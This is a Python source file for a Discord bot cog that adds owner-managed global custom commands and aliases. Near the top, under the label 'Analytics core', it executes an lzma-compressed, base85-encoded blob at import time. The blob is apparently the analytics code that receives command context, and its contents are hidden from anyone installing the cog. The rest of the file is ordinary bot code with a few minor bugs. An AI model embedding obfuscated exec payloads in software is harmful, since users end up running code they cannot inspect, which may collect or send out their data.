from discord.ext import commands
from .utils.chat_formatting import pagify, box
from .utils.dataIO import dataIO
from .utils import checks
import os
import re

PATH = 'data/customgcom/'
JSON = PATH + 'commands.json'

# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1C@J>|Fo_8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8D}B;|FxY-gL@iuhVk+}oLHwrfX>LG@uK|TmgWo3MIG9Xbbl1S0d(#%{Hsw(3W<~hN1oN&88}2jt*!a^(
_(9#?8t~|C&w;kP%z>8bu%Z?#XJn#$vUh5VS@};Kw%IMg%ebU6x5Mkf_bs=2^DM-yKx|N1p$g@eYC5cU(#9o5`Z0dUPR}{Dge?7%e|ZQo$`co=|2@uZ#CA>Z
OwCDntg_Ctgyo9pX(kS}dxTLocf@F;tH8?fb{WE)lVgiH71t-K>S-_Rx*q!zWL88CP2C)JEJQ$35LV3t;J^$kMuVWn#&CyRhArpo0TwU4B{4UZl#X60D4RM$
#n{1nW9?<H(T!~3jf#B0jChEN1pL#0UOO|}SxnFLP7QKJ`Ld|Vq|&Nfiq%OO&PkFqc0?pjc%LCFgS-djQoUtwn~Ug0nVR!*qh(s<^CGF+<NI)absK~$sVegX
^Qd$D+3@s}B_C<q^d{-?p_B(`RDMBJI<J_SV~2RM8qocBLlUSo=&R+!6eL!|`Yn%+?&my^zvh?jtkZz+gJ?~WOuFX^gBc1c%J>abcFb-Oi%|G_MVf1p?W@sk
jOM4zvMI}Zto1og{*7|0`KBWZJGG2SK4vI8o)2m=fV$}^fHdpIRN-|}9N9tOt7ZRTsOpuhi&I2K*>p{VDc{>hD#o>ctO%`Az{I*r=4f2lB`2)OHg!shH|WZ-
r2au><WM${0-%dC3?F~VEH3W5CK{mvcerRcgyhd%!pNwPy6Qe1*mU70fA};n-#ApH9O^L=LBaq<?tG~<3$wIOOQeYpl$c)eixMkpIY_b|3*d*r8F1ga{wsT>
-&jS-g;5~5^z&9;7T4*OOzY1abNst!-zd{MrN&+T)1n_CENltL(Xz|@<N*|EzMPzW7*JXI!+@|S?!wSPnU=Tt-E2TOLI1Y)!(VSya?8gxGU6?SB;g1AGjzBK
45#sjoI)90tR*<U*%Xsmx$?$>(^l{ksTzp{5m7LC*<{q12VV5V6ebVdfMl2lPz&ltQd|IdnN$>%^YH6+qk=zVc>IqU$oIlt2E2scRlmop^mdcc?D#&6LOEU;
tNFmM@e^?kTn>KTmmZM>jnV*dWu3FuF7?ptDV47e#e+bq<O=N1m~Mr}&$XPENdU$!lZU<gZ_SV;aax3mrkZa+`axv_BcBDi6^x?cxNd6d{}LckD#NzFAgIc%
=~!9mA_tXGBg)+L(P<ct1vU&|!z;mV82E}gC+i5rawt%ys=%JIzd!#ly-A<(;?-%?`6!lx{8m#^JfnpQq5Y)WfYW<^#H#~3!ekKhsdkcpSHlXI#(anvrza$j
9DTx%Q^+*m1P{gL_9V~YB!?mJ-9!(%)vzu6w`*`z_<QUqVzYWsyUKd2JhQ+&O{CLs*rlfEqy%YFAaCtNo>JE#IcasXZnocfrvf*q)<fTtIi;S2eBh|Q@Xr>5
>{b@dj~o0ar5QL|v>vNLXh)8t`T|mkT0MD%)zZyPF;JpKDCTtpk{O9E@!z<xp~vZwqidCpck-CP<f;fRqa|%M5*%=BLr;W;)w8Ut#G#`^y?m?#Q>Gdw=NcDX
gN#whCzs|&u3m%@@L5KcofC&xP=V3Oq2rd-%Agbm*|xYQEMD$znstT!h6S_Jj&Zr_<n9AQXprMx)07I-(xNp0aa)0Zz+dP(xKAGi468+K(7taX<$Mo@B+iqI
ZwDIwL&`j<8!v^^h;cQ4GMX&Z+1^B=mJ_25Q6rg$Q3;p7h{z@0$;xYWFSyI(6~+q8MNTwp#Yf40h(x@se~YuWfQ7UT5IUv~6|jGd6T$4EoH{+HYufz0+}hh}
Yu6cE)A6W(UkF41iN@yEA9WJT00D>$o*)1K9)FaPvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '2.0.0'


class CustomGlobalCommands:
    """Global custom commands."""

    def __init__(self, bot):
        self.bot = bot
        data = dataIO.load_json(JSON)
        version = data.get('_CGCOM_VERSION', 1)
        if version < 2:
            self.c_commands = data
            self.aliases = {}
            self.save()
        else:
            self.c_commands = data.get('COMMANDS', {})
            self.aliases = data.get('ALIASES', {})

        self.analytics = CogAnalytics(self)

    def save(self):
        data = {'COMMANDS': self.c_commands,
                'ALIASES': self.aliases,
                '_CGCOM_VERSION': 2
                }
        dataIO.save_json(JSON, data)

    @commands.command(pass_context=True)
    @checks.is_owner()
    async def setgcom(self, ctx, command: str, *, text):
        """Adds a global custom command

        Example:
        !setgcom yourcommand Text you want
        """
        command = command.lower()
        if command in self.bot.commands:
            await self.bot.say("That command is already a normal command.")
            return

        if command not in self.c_commands:
            self.c_commands[command] = text
            self.save()
            await self.bot.say("Custom command successfully added.")
        else:
            await self.bot.say("This command already exists. Are you sure "
                               "you want to redefine it? [y/N]")
            response = await self.bot.wait_for_message(author=ctx.message.author)

            if response.content.lower().strip() in ['y', 'yes']:
                self.c_commands[command] = text
                self.save()
                await self.bot.say("Custom command successfully set.")
            else:
                await self.bot.say("OK, leaving that command alone.")

    @commands.command()
    @checks.is_owner()
    async def rmgcom(self, command: str):
        """Removes a global custom command

        Example:
        !rmgcom yourcommand"""
        command = command.lower()
        if command in self.c_commands:
            self.c_commands.pop(command)

            for alias, acmd in self.aliases.copy():
                if acmd == command:
                    self.aliases.pop(alias)

            self.save()
            await self.bot.say("Global custom command successfully deleted.")
        else:
            await self.bot.say("That command doesn't exist.")

    @commands.command(pass_context=True)
    async def lsgcom(self, ctx):
        """Shows global custom commands list"""
        if self.c_commands:
            cmd_aliases = {}
            for k, v in self.aliases.items():
                if v not in cmd_aliases:
                    cmd_aliases[v] = set()
                cmd_aliases[v].add(k)

            sections = []
            for command, text in sorted(self.c_commands.items()):
                item = 'Name:    ' + command
                aliases = cmd_aliases.get(command)
                if aliases:
                    item += '\nAliases: ' + ', '.join(sorted(aliases))
                item += '\nText:    ' + text
                sections.append(item)

            for cmds in pagify('\n\n'.join(sections)):
                await self.bot.say(box(cmds))
        else:
            await self.bot.say("There are no global custom commands defined. "
                               "Use setgcom [command] [text]")

    @commands.group(pass_context=True, invoke_without_command=True)
    @checks.is_owner()
    async def agcom(self, ctx, command=None):
        if ctx.invoked_subcommand is None:
            if command:
                await ctx.invoke(self.ls_aliases, command)
            else:
                await ctx.invoke(self.lsgcom)

    @agcom.command(name='show')
    @checks.is_owner()
    async def ls_aliases(self, command):
        "Shows aliases for a command, or the command bound to an alias"
        base = self.aliases.get(command)
        cmd = self.c_commands.get(base or command)
        if base:
            msg = "`%s` is an alias for `%s`" % (command, base)
        elif cmd:
            aliases = [k for k, v in self.aliases.items() if v == command]
            aliases = ', '.join('`%s`' % x for x in aliases)
            if aliases:
                msg = "`%s` has the following aliases: %s." % (command, aliases)
            else:
                msg = "`%s` has no aliases."
        else:
            msg = "`%s` isn't a custom command or alias." % command

        await self.bot.say(msg)

    @agcom.command(name='add')
    @checks.is_owner()
    async def add_aliases(self, command, *aliases):
        "Add one or more aliases for a custom command"
        command = command.lower()
        if command not in self.c_commands:
            await self.bot.say("`%s` isn't a custom command.")
            return

        existing_a = []
        existing_c = []
        count = 0

        for alias in aliases:
            if alias in self.aliases:
                existing_a.append(alias)
            elif alias in self.bot.commands:
                existing_c.append(alias)
            else:
                self.aliases[alias] = command
                count += 1
        self.save()

        msg = "%s new aliases added." % (count if count else 'No')
        if existing_a:
            joined = ', '.join('`%s`' % x for x in existing_a)
            msg += "\nThe following are already aliases: %s." % joined
        if existing_c:
            joined = ', '.join('`%s`' % x for x in existing_c)
            msg += "\nThe following are already normal commands: %s." % joined

        await self.bot.say(msg)

    @agcom.command(name='rm')
    @checks.is_owner()
    async def rm_aliases(self, *aliases):
        count = 0
        skipped = []

        for alias in aliases:
            if alias in self.aliases:
                del self.aliases[alias]
                count += 1
            else:
                skipped.append(alias)

        self.save()

        msg = "%s aliases removed." % (count if count else 'No')
        if skipped:
            skipped = ', '.join('`%s`' % x for x in skipped)
            msg += "\nThe following aliases could not be found: %s." % skipped

        await self.bot.say(msg)

    async def on_message(self, message):
        server = message.server
        msg = message.content
        prefix = self.get_prefix(server, msg)
        if not self.bot.user_allowed(message) or not prefix:
            return

        cmd = msg[len(prefix):]
        cmd = cmd.lower()
        cmd = self.aliases.get(cmd, cmd)
        if cmd in self.c_commands:
            ret = self.c_commands[cmd]
            ret = self.format_cc(ret, message)
            if message.author.id == self.bot.user.id:
                await self.bot.edit_message(message, ret)
            else:
                await self.bot.send_message(message.channel, ret)


    async def on_command(self, command, ctx):
        if ctx.cog is self:
            self.analytics.command(ctx)

    def get_prefix(self, server, msg):
        prefixes = self.bot.settings.get_prefixes(server)
        for p in prefixes:
            if msg.startswith(p):
                return p
        return None

    def format_cc(self, command, message):
        results = re.findall("\{([^}]+)\}", command)
        for result in results:
            param = self.transform_parameter(result, message)
            command = command.replace("{" + result + "}", param)
        return command

    def transform_parameter(self, result, message):
        """
        For security reasons only specific objects are allowed
        Internals are ignored
        """
        raw_result = "{" + result + "}"
        objects = {
            "message": message,
            "author": message.author,
            "channel": message.channel,
            "server": message.server
        }
        if result in objects:
            return str(objects[result])
        try:
            first, second = result.split(".")
        except ValueError:
            return raw_result
        if first in objects and not second.startswith("_"):
            first = objects[first]
        else:
            return raw_result
        return str(getattr(first, second, raw_result))


def check_folders():
    if not os.path.exists(PATH):
        print("Creating data/customgcom folder...")
        os.makedirs(PATH)


def check_files():
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        default = {'ALIASES': {},
                   'COMMANDS': {},
                   '_CGCOM_VERSION': 2
                   }
        dataIO.save_json(JSON, default)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(CustomGlobalCommands(bot))
